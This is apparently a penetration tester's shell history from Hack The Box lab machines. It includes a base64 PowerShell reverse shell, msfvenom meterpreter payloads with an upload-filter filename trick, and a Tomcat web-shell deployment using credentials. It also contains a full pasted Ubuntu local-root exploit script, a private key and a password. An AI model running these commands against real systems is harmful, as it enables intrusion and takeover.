kAbgBnACAAdwBlAG4AdAAgAHcAcgBvAG4AZwAhACAAQwBoAGUAYwBrACAAaQBmACAAdABoAGUAIABzAGUAcgB2AGUAcgAgAGkAcwAgAHIAZQBhAGMAaABhAGIAbABlACAAYQBuAGQAIAB5AG8AdQAgAGEAcgBlACAAdQBzAGkAbgBnACAAdABoAGUAIABjAG8AcgByAGUAYwB0ACAAcABvAHIAdAAuACIACgAgACAAIAAgACAAIAAgACAAVwByAGkAdABlAC0ARQByAHIAbwByACAAJABfAAoAIAAgACAAIAB9AAoACgB9AAoACgBJAG4AdgBvAGsAZQAtAFAAbwB3AGUAcgBTAGgAZQBsAGwAVABjAHAAIAAtAFIAZQB2AGUAcgBzAGUAIAAtAEkAUABBAGQAZAByAGUAcwBzACAAMQAwAC4AMQAwAC4AMQA0AC4AMgAgAC0AUABvAHIAdAAgADEAMgAzADQACgA=
 6830  2020-11-16 07:07  vim shell.ps1
 6831  2020-11-16 07:07  ip a
 6832  2020-11-16 07:07  vim shell.ps1
 6833  2020-11-16 07:07  cat shell.ps1 | iconv -t UTF-16LE | base64 -w0 | xclip -selection clipboard
 6834  2020-11-16 19:27  cd ..
 6835  2020-11-16 19:27  l;s
 6836  2020-11-16 19:27  cd 10.10.10.17
 6837  2020-11-16 19:27  cd ..
 6838  2020-11-16 19:27  .
 6839  2020-11-16 19:27  l
 6840  2020-11-16 19:27  cd 10.10.10.7
 6841  2020-11-16 19:27  l
 6842  2020-11-16 19:27  cd exploit
 6843  2020-11-16 19:27  l
 6844  2020-11-16 19:28  vim 18650.py
 6845  2020-11-16 19:30  cd ..
 6846  2020-11-16 19:30  vim 18650.py
 6847  2020-11-16 19:30  cd ..
 6848  2020-11-16 19:30  ./create_direcotry.sh 10.10.10.194
 6849  2020-11-16 19:30  l
 6850  2020-11-16 19:30  cd results
 6851  2020-11-16 19:30  l
 6852  2020-11-16 19:30  cd 10.10.10.194
 6853  2020-11-16 19:30  cd scans
 6854  2020-11-16 19:30  l
 6855  2020-11-16 19:30  ping 10.10.10.194
 6856  2020-11-16 19:31  nmap -sCV -oA top1000 10.10.10.194
 6857  2020-11-16 19:31  crul 10.10.10.194
 6858  2020-11-16 19:31  curl 10.10.10.194
 6859  2020-11-16 19:33  searchsploit mega hosting
 6860  2020-11-16 19:41  ip a
 6861  2020-11-16 19:41  sudo tcpdump  -i tun0
 6862  2020-11-16 19:42  sudo nc -nlvp 443
 6863  2020-11-16 19:46  sudo python -m SimpleHTTPServer 80
 6864  2020-11-16 19:47  locate windows/remote/39161.py
 6865  2020-11-16 19:47  locate ~/HTB | grep .war
 6866  2020-11-16 19:47  cp /home/kali/HTB/results/10.10.10.95/exploit/pwn.war ../exploit
 6867  2020-11-16 19:47  cd .. 
 6868  2020-11-16 19:47  cd exploit
 6869  2020-11-16 19:47  l
 6870  2020-11-16 19:48  vim pwn.war
 6871  2020-11-16 19:48  sudo python -m SimpleHTTPServer 80
 6872  2020-11-16 19:57  searchsploit mega hosting
 6873  2020-11-16 19:57  serachsploit -x php/webapps/8230.txt
 6874  2020-11-16 19:57  searchsploit -x php/webapps/8230.txt
 6875  2020-11-16 20:05  vim /etc/hosts
 6876  2020-11-16 20:05  sudo vim /etc/hosts
 6877  2020-11-16 20:07  ps aux | firefox
 6878  2020-11-16 22:49  sudo vim /etc/hosts
 6879  2020-11-17 10:10  crul -h
 6880  2020-11-17 10:10  cur l-h
 6881  2020-11-17 10:10  curl -h
 6882  2020-11-17 10:12  curl -T cmdjsp.jsp -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/host-manager/
 6883  2020-11-17 10:14  curl -T cmdjsp.jsp -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/host-manager/test
 6884  2020-11-17 10:15  ip a
 6885  2020-11-17 10:17  sudo /etc/hosts
 6886  2020-11-17 10:18  sudo vim  /etc/hosts
 6887  2020-11-17 10:22  ping 10.10.10.194
 6888  2020-11-17 10:24  curl -T cmdjsp.jsp -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/host-manager/
 6889  2020-11-17 10:24  ping 10.10.10.194
 6890  2020-11-17 10:28  curl -T cmdjsp.jsp -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/host-manager/
 6891  2020-11-17 10:28  l
 6892  2020-11-17 10:29  zip cmdjsp.war cmdjsp.jsp
 6893  2020-11-17 10:29  l
 6894  2020-11-17 10:32  curl -T cmdjsp.war -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/deploy?path=/app
 6895  2020-11-17 10:33  curl -T cmdjsp.war -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/deploy?path=/app
 6896  2020-11-17 10:33  curl -T cmdjsp.war -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/
 6897  2020-11-17 10:33  curl -T cmdjsp.war -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager
 6898  2020-11-17 10:33  curl -T cmdjsp.war -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text
 6899  2020-11-17 10:36  curl -T cmdjsp.war -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/deploy?path=/app
 6900  2020-11-17 10:36  curl -T cmdjsp.war -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/deploy\?path\=/app
 6901  2020-11-17 10:44  touch bashrshell.sh
 6902  2020-11-17 10:44  vim bashrshell.sh
 6903  2020-11-17 10:46  sudo python -m SimpleHTTPServer 80
 6904  2020-11-17 10:48  vim bashrshell.sh
 6905  2020-11-17 10:48  sudo python -m SimpleHTTPServer 80
 6906  2020-11-17 10:49  vim bashrshell.sh
 6907  2020-11-17 10:52  sudo python -m SimpleHTTPServer 80
 6908  2020-11-17 10:52  vim bashrshell.sh
 6909  2020-11-17 10:53  sudo python -m SimpleHTTPServer 80
 6910  2020-11-17 11:01  cd ..
 6911  2020-11-17 11:01  l
 6912  2020-11-17 11:01  cd linux_priv_esc_scripts
 6913  2020-11-17 11:01  sudo python -m SimpleHTTPServer 80
 6914  2020-11-17 11:01  l
 6915  2020-11-17 11:01  sudo python -m SimpleHTTPServer 80
 6916  2020-11-17 11:09  eixt
 6917  2020-11-17 11:09  exit
 6918  2020-11-17 11:13  sudo nc -nlvp 443
 6919  2020-11-17 11:14  lol.b64
 6920  2020-11-17 11:14  touch back.b64
 6921  2020-11-17 11:14  vim back.b64
 6922  2020-11-17 11:14  base64 -d back.b64 back.zip
 6923  2020-11-17 11:15  base64 -d back.b64 > back.zip
 6924  2020-11-17 11:15  l
 6925  2020-11-17 11:15  base64 -d back.b64 > backup.zip
 6926  2020-11-17 11:15  ls
 6927  2020-11-17 11:15  l
 6928  2020-11-17 11:15  rm back.zip
 6929  2020-11-17 11:15  vim backup.zip
 6930  2020-11-17 11:16  unzip backup.zip
 6931  2020-11-17 11:16  ls
 6932  2020-11-17 11:16  rm backup.zip
 6933  2020-11-17 11:16  vim back.b64
 6934  2020-11-17 11:17  ls
 6935  2020-11-17 11:17  vim .
 6936  2020-11-17 11:17  l
 6937  2020-11-17 11:17  vim .
 6938  2020-11-17 11:18  l
 6939  2020-11-17 11:18  base64 -d back.zip.b64 > backup.zip
 6940  2020-11-17 11:18  vim .
 6941  2020-11-17 11:19  l
 6942  2020-11-17 11:19  rm -rf backup.zip
 6943  2020-11-17 11:19  l
 6944  2020-11-17 11:19  vim backup.zip.b64
 6945  2020-11-17 11:20  base64 -d backup.zip.b64 > backup.zip
 6946  2020-11-17 11:20  unzip backup.zip
 6947  2020-11-17 11:20  mv  backup.zip backup.zip.b64 ../../10.10.10.194/exploit
 6948  2020-11-17 11:21  cd ../../10.10.10.194/exploit 
 6949  2020-11-17 11:21  l
 6950  2020-11-17 11:21  unzip backup.zip
 6951  2020-11-17 11:22  zip2john
 6952  2020-11-17 11:22  zip2john backup.zip
 6953  2020-11-17 11:23  zip2john backup.zip > johncrack.zip
 6954  2020-11-17 11:23  ls
 6955  2020-11-17 11:23  vim johncrack.zip
 6956  2020-11-17 11:23  john  -w=/usr/share/wordlists/rockyou.txt johncrack.zip
 6957  2020-11-17 11:23  l
 6958  2020-11-17 19:18  unzip backup.zip
 6959  2020-11-17 19:21  ls
 6960  2020-11-17 19:22  cd var
 6961  2020-11-17 19:22  kl
 6962  2020-11-17 19:22  l
 6963  2020-11-17 19:22  cd www
 6964  2020-11-17 19:22  l
 6965  2020-11-17 19:22  cd html
 6966  2020-11-17 19:22  l
 6967  2020-11-17 19:22  vim Readme.txt
 6968  2020-11-17 19:22  cat news.php
 6969  2020-11-17 19:22  cat index.php
 6970  2020-11-17 19:22  ls
 6971  2020-11-17 19:22  cd files
 6972  2020-11-17 19:22  l
 6973  2020-11-17 19:22  cd ..
 6974  2020-11-17 19:22  cd assets
 6975  2020-11-17 19:22  l
 6976  2020-11-17 19:22  cd ..
 6977  2020-11-17 19:22  l
 6978  2020-11-17 19:23  cat favicon.ico
 6979  2020-11-17 19:23  grep -i "password" index.php
 6980  2020-11-17 19:23  grep -i "l" index.php
 6981  2020-11-17 19:23  vim index.php
 6982  2020-11-17 19:28  sudo nc -nlvp 443
 6983  2020-11-17 19:29  cd ..
 6984  2020-11-17 19:29  l
 6985  2020-11-17 19:29  cd 10.10.10.194
 6986  2020-11-17 19:29  l
 6987  2020-11-17 19:29  cd exploit
 6988  2020-11-17 19:29  l
 6989  2020-11-17 19:29  sudo python -m SimpleHTTPServer 80
 6990  2020-11-17 19:29  ipa
 6991  2020-11-17 19:29  ip a
 6992  2020-11-17 19:29  sudo python -m SimpleHTTPServer 80
 6993  2020-11-17 19:30  ip a
 6994  2020-11-17 19:30  l
 6995  2020-11-17 19:30  sudo python -m SimpleHTTPServer 80
 6996  2020-11-17 19:33  l
 6997  2020-11-17 19:33  ssh ash@10.10.10.194
 6998  2020-11-17 19:34  sudo nc -nlvp 443
 6999  2020-11-17 20:00  touch id_rsa
 7000  2020-11-17 20:00  vim id_rsa
 7001  2020-11-17 20:01  chmod 600 id_rsa
 7002  2020-11-17 20:01  ssh -i id_rsa ash@10.10.10.194
 7003  2020-11-17 20:01  cd ..
 7004  2020-11-17 20:01  l
 7005  2020-11-17 20:01  cd ..
 7006  2020-11-17 20:01  l
 7007  2020-11-17 20:02  cd linux_priv_esc_scripts
 7008  2020-11-17 20:02  ls
 7009  2020-11-17 20:02  sudo python -m SimpleHTTPServer 80
 7010  2020-11-17 20:19  cd ..
 7011  2020-11-17 20:19  ls
 7012  2020-11-17 20:19  cd results
 7013  2020-11-17 20:19  l
 7014  2020-11-17 20:19  cd 10.10.10.194
 7015  2020-11-17 20:19  l
 7016  2020-11-17 20:19  cd exploit
 7017  2020-11-17 20:19  l
 7018  2020-11-17 20:19  git clone  https://github.com/saghul/lxd-alpine-builder.git\n
 7019  2020-11-17 20:19  git --help
 7020  2020-11-17 20:19  git clone https://github.com/saghul/lxd-alpine-builder.git\n
 7021  2020-11-17 20:20  ls
 7022  2020-11-17 20:20  cd lxd-alpine-builder
 7023  2020-11-17 20:20  ./build-alpine
 7024  2020-11-17 20:20  sudo ./build-alpine
 7025  2020-11-17 20:20  l
 7026  2020-11-17 20:20  sudo python -m SimpleHTTPServer 80
 7027  2020-11-18 07:02  ping 10.10.10.3
 7028  2020-11-18 07:02  exit
 7029  2020-11-18 07:08  ls
 7030  2020-11-18 07:08  cd HTB
 7031  2020-11-18 07:08  ls
 7032  2020-11-18 07:08  ./create_direcotry.sh 10.10.10.3
 7033  2020-11-18 07:08  ls
 7034  2020-11-18 07:08  cd results
 7035  2020-11-18 07:08  l
 7036  2020-11-18 07:08  cd 10.10.10.3
 7037  2020-11-18 07:08  ls
 7038  2020-11-18 07:08  cd scans
 7039  2020-11-18 07:08  l
 7040  2020-11-18 07:09  rm ./*
 7041  2020-11-18 07:09  l
 7042  2020-11-18 07:09  cat .X0-lock
 7043  2020-11-18 07:09  rm .X0-lock
 7044  2020-11-18 07:09  nmap -sCV -oA  top1000 10.10.10.3
 7045  2020-11-18 07:18  nmap -sCV -Pn -oA  top1000 10.10.10.3
 7046  2020-11-18 07:19  searchsploit Samba 3.0.20
 7047  2020-11-18 07:21  cd ..
 7048  2020-11-18 07:21  ls
 7049  2020-11-18 07:21  cd exploit
 7050  2020-11-18 07:21  l
 7051  2020-11-18 07:21  touch lol.py
 7052  2020-11-18 07:21  vim lol.py
 7053  2020-11-18 07:22  chmod +x lol.py
 7054  2020-11-18 07:22  python3 lol.py 10.10.10.3
 7055  2020-11-18 07:23  nc -lvp 9999
 7056  2020-11-18 07:23  python3 lol.py 10.10.10.3
 7057  2020-11-18 07:23  vim lol.py
 7058  2020-11-18 07:24  python3 lol.py 10.10.10.3
 7059  2020-11-18 07:24  vim lol.py
 7060  2020-11-18 07:25  ip a
 7061  2020-11-18 07:25  vim lol.py
 7062  2020-11-18 07:25  nc -lvp 9999
 7063  2020-11-18 07:26  python3 lol.py 10.10.10.3
 7064  2020-11-18 07:26  pip3 install --user smb
 7065  2020-11-18 07:29  pip3 install --user SMBConnection
 7066  2020-11-18 07:29  pip3 install --user smb
 7067  2020-11-18 07:30  pip3 install --user impacket
 7068  2020-11-18 07:31  pip install --user impacket
 7069  2020-11-18 07:31  ls
 7070  2020-11-18 07:31  vim lol.py
 7071  2020-11-18 07:35  ls
 7072  2020-11-18 07:35  python3 lol.py
 7073  2020-11-18 07:35  python lol.py
 7074  2020-11-18 07:35  l
 7075  2020-11-18 07:36  ImportError: No module named smb.SMBConnection 
 7076  2020-11-18 07:36  sudo apt-get install -y python3-smb
 7077  2020-11-18 07:37  python lol.py
 7078  2020-11-18 07:37  python3 lol.py
 7079  2020-11-18 07:37  id
 7080  2020-11-18 07:37  nc -lvp 9999
 7081  2020-11-18 07:37  cd ..
 7082  2020-11-18 07:37  l
 7083  2020-11-18 07:37  cd scans
 7084  2020-11-18 07:37  l
 7085  2020-11-18 07:38  cat top1000.nmap
 7086  2020-11-18 07:39  cd '..\nl
 7087  2020-11-18 07:39  cd ..
 7088  2020-11-18 07:39  l
 7089  2020-11-18 07:39  cd exploit
 7090  2020-11-18 07:39  l
 7091  2020-11-18 07:39  vim lol.py
 7092  2020-11-18 07:39  nc -lvp 9999
 7093  2020-11-18 07:39  python3 lol.py
 7094  2020-11-18 07:42  exit
 7095  2020-11-18 07:42  cd ..
 7096  2020-11-18 09:33  ping 10.10.10.7
 7097  2020-11-18 10:03  ping 10.10.10.6
 7098  2020-11-18 10:04  cd ..
 7099  2020-11-18 10:04  ls
 7100  2020-11-18 10:04  ./create_direcotry.sh 10.10.10.6
 7101  2020-11-18 10:04  ls
 7102  2020-11-18 10:04  cd results
 7103  2020-11-18 10:04  cd 10.10.10.7
 7104  2020-11-18 10:04  l
 7105  2020-11-18 10:05  cd scans
 7106  2020-11-18 10:05  ls
 7107  2020-11-18 10:05  vim gobuster.txt
 7108  2020-11-18 10:05  cat basic_scan.nmap
 7109  2020-11-18 10:07  cd ..
 7110  2020-11-18 10:07  l
 7111  2020-11-18 10:07  cd exploit
 7112  2020-11-18 10:07  ;l
 7113  2020-11-18 10:07  vim 18650.py
 7114  2020-11-18 10:07  cd ..
 7115  2020-11-18 10:08  l
 7116  2020-11-18 10:08  cd 10.10.10.6
 7117  2020-11-18 10:08  l
 7118  2020-11-18 10:08  cd scans
 7119  2020-11-18 10:08  l
 7120  2020-11-18 10:08  nmap -sCV -oA top1000 10.10.10.6
 7121  2020-11-18 10:10  gobuster dir -u http://10.10.10.6/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o gobuster80.txt
 7122  2020-11-18 10:11  searchsploit TorrentHoster
 7123  2020-11-18 10:12  searchsploit Torrent
 7124  2020-11-18 10:12  searchsploit Torrent h
 7125  2020-11-18 10:12  searchsploit -x php/webapps/11746.txt
 7126  2020-11-18 10:24  cd ..
 7127  2020-11-18 10:24  ls
 7128  2020-11-18 10:24  cd exploit
 7129  2020-11-18 10:24  l
 7130  2020-11-18 10:26  ip a
 7131  2020-11-18 10:27  msfvenom -p php/meterpreter/reverse_tcp  LHOST=10.10.14.32 LPORT=443 -e php/base64 -f raw > shell.php
 7132  2020-11-18 10:29  l
 7133  2020-11-18 10:29  vim shell.php
 7134  2020-11-18 10:34  ls
 7135  2020-11-18 10:34  mv shell.php shell.php;.png
 7136  2020-11-18 10:34  l
 7137  2020-11-18 10:37  mv shell.php "shell.php;.png"
 7138  2020-11-18 10:37  l
 7139  2020-11-18 10:37  ls
 7140  2020-11-18 10:49  cd Downloads
 7141  2020-11-18 10:49  ls
 7142  2020-11-18 10:49  vim .
 7143  2020-11-18 10:51  ls
 7144  2020-11-18 10:51  rm Kaliiii-Linux.torrent 
 7145  2020-11-18 10:54  rm kali-linux-2020.3-installer-amd64.iso\(1\).torrent
 7146  2020-11-18 10:55  rm kali-linux-2020.3-installer-amd64.iso.torrent
 7147  2020-11-18 10:58  nc -lvp 443
 7148  2020-11-18 10:58  sudo nc -lvp 443
 7149  2020-11-18 11:00  ip a
 7150  2020-11-18 11:01  sudo msfconsole -q -x "use exploit/multi/handler;\\n>\nset PAYLOAD linux/x86/meterpreter/reverse_tcp;\\n>\nset LHOST 10.11.0.4;\\n>\nset LPORT 443;\\n>\nrun"
 7151  2020-11-18 11:02  sudo msfconsole -q -x "use exploit/multi/handler;\\n>\nset PAYLOAD php/meterpreter/reverse_tcp;\\n>\nset LHOST 10.10.10.32;\\n>\nset LPORT 443;\\n>\nrun"
 7152  2020-11-18 11:10  cd ..
 7153  2020-11-18 11:10  cd linux_priv_esc_scripts
 7154  2020-11-18 11:10  l
 7155  2020-11-18 11:11  sudo python -m SimpleHTTPServer 80
 7156  2020-11-18 11:23  searchsploit -x linux/local/14339.sh
 7157  2020-11-18 11:24  searchsploit -p linux/local/14339.sh
 7158  2020-11-18 11:24  cd ..
 7159  2020-11-18 11:24  cd results/10.10.10.6
 7160  2020-11-18 11:24  cd exploit
 7161  2020-11-18 11:24  cp /usr/share/exploitdb/exploits/linux/local/14339.sh ./
 7162  2020-11-18 11:24  l
 7163  2020-11-18 11:24  vim 14339.sh
 7164  2020-11-18 11:25  sudo python -m SimpleHTTPServer 80
 7165  2020-11-18 11:29  searchsploit -x linux/local/14339.sh | xclip
 7166  2020-11-18 11:31  searchsploit -x linux/local/14339.sh less
 7167  2020-11-18 11:33  vim /usr/share/exploitdb/exploits/linux/local/14339.sh
 7168  2020-11-18 11:34  cd HTB/results/10.10.10.6/exploit
 7169  2020-11-18 11:34  l
 7170  2020-11-18 11:34  vim 14339.sh
 7171  2020-11-18 11:34  vim 14339.sh | xclip
 7172  2020-11-18 11:35  cd HTB/results/10.10.10.6
 7173  2020-11-18 11:35  ls
 7174  2020-11-18 11:35  cd exploit
 7175  2020-11-18 11:35  l
 7176  2020-11-18 11:35  cat 14339.sh | xclip
 7177  2020-11-18 11:35  #!/bin/bash\n#\n# Local root by adding temporary user toor:toor with id 0 to /etc/passwd & /etc/shadow.\n# Does not prompt for login by creating temporary SSH key and authorized_keys entry.\n#\n#   user@ubuntu:~$ bash ubuntu-pam-motd-localroot.sh\n#   [*] Ubuntu PAM MOTD local root\n#   [*] Backuped /home/user/.ssh/authorized_keys\n#   [*] SSH key set up\n#   [*] Backuped /home/user/.cache\n#   [*] spawn ssh\n#   [+] owned: /etc/passwd\n#   [*] spawn ssh\n#   [+] owned: /etc/shadow\n#   [*] Restored /home/user/.cache\n#   [*] Restored /home/user/.ssh/authorized_keys\n#   [*] SSH key removed\n#   [+] Success! Use password toor to get root\n#   Password:\n#   root@ubuntu:/home/user# id\n#   uid=0(root) gid=0(root) groupes=0(root)\n#\nP='toor:x:0:0:root:/root:/bin/bash'\nS='toor:$6$tPuRrLW7$m0BvNoYS9FEF9/Lzv6PQospujOKt0giv.7JNGrCbWC1XdhmlbnTWLKyzHz.VZwCcEcYQU5q2DLX.cI7NQtsNz1:14798:0:99999:7:::'\necho "[*] Ubuntu PAM MOTD local root"\n[ -z "$(which ssh)" ] && echo "[-] ssh is a requirement" && exit 1\n[ -z "$(which ssh-keygen)" ] && echo "[-] ssh-keygen is a requirement" && exit 1\n[ -z "$(ps -u root |grep sshd)" ] && echo "[-] a running sshd is a requirement" && exit 1\nbackup() {\n    [ -e "$1" ] && [ -e "$1".bak ] && rm -rf "$1".bak\n    [ -e "$1" ] || return 0\n    mv "$1"{,.bak} || return 1\n    echo "[*] Backuped $1"\n}\nrestore() {\n    [ -e "$1" ] && rm -rf "$1"\n    [ -e "$1".bak ] || return 0\n    mv "$1"{.bak,} || return 1\n    echo "[*] Restored $1"\n}\nkey_create() {\n    backup ~/.ssh/authorized_keys\n    ssh-keygen -q -t rsa -N '' -C 'pam' -f "$KEY" || return 1\n    [ ! -d ~/.ssh ] && { mkdir ~/.ssh || return 1; }\n    mv "$KEY.pub" ~/.ssh/authorized_keys || return 1\n    echo "[*] SSH key set up"\n}\nkey_remove() {\n    rm -f "$KEY"\n    restore ~/.ssh/authorized_keys\n    echo "[*] SSH key removed"\n}\nown() {\n    [ -e ~/.cache ] && rm -rf ~/.cache\n    ln -s "$1" ~/.cache || return 1\n    echo "[*] spawn ssh"\n    ssh -o 'NoHostAuthenticationForLocalhost yes' -i "$KEY" localhost true\n    [ -w "$1" ] || { echo "[-] Own $1 failed"; restore ~/.cache; bye; }\n    echo "[+] owned: $1"\n}\nbye() {\n    key_remove\n    exit 1\n}\nKEY="$(mktemp -u)"\nkey_create || { echo "[-] Failed to setup SSH key"; exit 1; }\nbackup ~/.cache || { echo "[-] Failed to backup ~/.cache"; bye; }\nown /etc/passwd && echo "$P" >> /etc/passwd\nown /etc/shadow && echo "$S" >> /etc/shadow\nrestore ~/.cache || { echo "[-] Failed to restore ~/.cache"; bye; }\nkey_remove\necho "[+] Success! Use password toor to get root"\nsu -c "sed -i '/toor:/d' /etc/{passwd,shadow}; chown root: /etc/{passwd,shadow}; \\n  chgrp shadow /etc/shadow; nscd -i passwd >/dev/null 2>&1; bash" toor\n
 7178  2020-11-18 11:38  cd
 7179  2020-11-18 11:38  cd HTB
 7180  2020-11-18 11:38  l
 7181  2020-11-19 08:20  ping 10.10.10.171
 7182  2020-11-19 08:20  ls
 7183  2020-11-19 08:20  cd results
 7184  2020-11-19 08:20  l;
 7185  2020-11-19 08:20  cd 10.10.10.171
 7186  2020-11-19 08:20  l
 7187  2020-11-19 08:20  cd scans
 7188  2020-11-19 08:20  l
 7189  2020-11-19 08:20  nmap -sCV -oA top1000 10.10.10.171
 7190  2020-11-19 08:22  gobuster dir -u 10.10.10.171 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o gobuster80.txt
 7191  2020-11-19 08:35  searchsploit -x linux/local/14339.sh less
 7192  2020-11-19 08:35  searchsploit openadmin
 7193  2020-11-19 08:35  searchsploit open admin
 7194  2020-11-19 08:40  serachsploit -x php/webapps/47691.sh
 7195  2020-11-19 08:40  searchsploit -x php/webapps/47691.sh
 7196  2020-11-19 08:40  cd. .
 7197  2020-11-19 08:40  cd ..
 7198  2020-11-19 08:40  ls
 7199  2020-11-19 08:40  cd exploit
 7200  2020-11-19 08:40  l
 7201  2020-11-19 08:40  locate php/webapps/47691.sh
 7202  2020-11-19 08:40  cp /usr/share/exploitdb/exploits/php/webapps/47691.sh ./
 7203  2020-11-19 08:40  ls
 7204  2020-11-19 08:40  vim 47691.sh
 7205  2020-11-19 08:40  ./47691.sh
 7206  2020-11-19 08:40  ./47691.sh -h
 7207  2020-11-19 08:40  ./47691.sh
 7208  2020-11-19 08:41  ./47691.sh http://10.10.10.171/ona/
 7209  2020-11-19 08:41  bash 47691.sh http://10.10.10.171/ona/
 7210  2020-11-19 08:41  vim 47691.sh
 7211  2020-11-19 08:41  searchsploit open admin
 7212  2020-11-19 08:41  msfconsole -q 
 7213  2020-11-19 08:44  ip a
 7214  2020-11-19 08:47  vim /etc/hosts
 7215  2020-11-19 08:47  sudo vim /etc/hosts
 7216  2020-11-19 09:00  ssh jimmy@10.10.10.171
 7217  2020-11-19 09:00  ssh joanna@10.10.10.171
 7218  2020-11-19 09:02  l
 7219  2020-11-19 09:02  cd HTB
 7220  2020-11-19 09:02  ls
 7221  2020-11-19 09:02  cd linux_priv_esc_scripts/n
 7222  2020-11-19 09:02  cd linux_priv_esc_scripts
 7223  2020-11-19 09:02  l
 7224  2020-11-19 09:02  sudo python -m SimpleHTTPServer 80
 7225  2020-11-19 10:02  ssh jimmy@10.10.10.171
 7226  2020-11-19 10:03  cd
 7227  2020-11-19 10:03  l
 7228  2020-11-19 10:03  cd HTB/linux_priv_esc_scripts
 7229  2020-11-19 10:03  sudo python -m SimpleHTTPServer 80
 7230  2020-11-19 10:03  l
 7231  2020-11-19 10:03  sudo python -m SimpleHTTPServer 80
 7232  2020-11-19 18:50  n1nj4W4rri0R!
 7233  2020-11-19 18:50  exit
 7234  2020-11-19 18:51  ssh jimmy@10.10.10.171
 7235  2020-11-19 19:02  cd ..
 7236  2020-11-19 19:02  l
 7237  2020-11-19 19:02  cd results
 7238  2020-11-19 19:02  l
 7239  2020-11-19 19:02  cd 10.10.10.171
 7240  2020-11-19 19:02  l
 7241  2020-11-19 19:02  cd scans
 7242  2020-11-19 19:02  l
 7243  2020-11-19 19:02  cat top1000.nmap
 7244  2020-11-19 19:10  ls
 7245  2020-11-19 19:10  c HTB/results/10.10.10.171/exploit
 7246  2020-11-19 19:10  cd HTB/results/10.10.10.171/exploit
 7247  2020-11-19 19:11  touch joannakey
 7248  2020-11-19 19:11  vim joannakey \n: 1605813075:0;vim joannakey 
 7249  2020-11-19 19:12  -----BEGIN RSA PRIVATE KEY-----                                                                                                                                                                                                                                                                                                                                         \nProc-Type: 4,ENCRYPTED                                                                                                                                                                                                                                                                                                                                                  \nDEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D                                                                                                                                                                                                                                                                                                                  \n                                                                                                                                                                                                                                                                                                                                                                        \nkG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8                                                                                                                                                                                                                                                                                                        \nad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO                                                                                                                                                                                                                                                                                                        \nShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE                                                                                                                                                                                                                                                                                                        \n6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ                                                                                                                                                                                                                                                                                                        \nZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du                                                                                                                                                                                                                                                                                                        \ny8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI                                                                                                                                                                                                                                                                                                        \n9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4                                                                                                                                                                                                                                                                                                        \npiC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/                                                                                                                                                                                                                                                                                                        \n/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH                                                                                                                                                                                                                                                                                                        \n40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ                                                                                                                                                                                                                                                                                                        \nfnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb\n9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80\nX1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg\nS33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F\nFnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh\nTh5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa\nRTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z\nuhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr\n1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2\nXGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79\nyPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM\n+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt\nqlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt\nz0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe\nK1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN\n-----END RSA PRIVATE 